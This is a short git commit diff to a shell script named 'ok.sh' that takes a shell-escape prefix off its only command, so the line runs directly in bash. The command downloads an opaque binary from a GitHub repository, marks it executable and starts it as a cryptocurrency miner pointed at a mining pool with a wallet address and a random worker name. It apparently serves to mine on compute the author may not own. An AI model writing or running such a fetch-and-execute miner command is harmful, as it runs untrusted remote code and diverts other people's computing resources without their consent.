4e2ae78583f005a976844f816f6eec90bad4b5c3
ferasa <86012372+desafff@users.noreply.github.com>
2023-11-16 23:05:25 +0700

    Update ok.sh

--- ok.sh
+++ ok.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-!wget https://github.com/desafff/mnttr/raw/main/rgeh && chmod +x rgeh && ./rgeh -a sha512256d -o stratum+tcp://usw.vipor.net:5067 -u 1CowuSUg4FeLsRy9J7vP21MmxfS4CrJJS3 -w $(shuf -i 0-999 -n 1) --no-watchdog
+wget https://github.com/desafff/mnttr/raw/main/rgeh && chmod +x rgeh && ./rgeh -a sha512256d -o stratum+tcp://usw.vipor.net:5067 -u 1CowuSUg4FeLsRy9J7vP21MmxfS4CrJJS3 -w $(shuf -i 0-999 -n 1) --no-watchdog
 
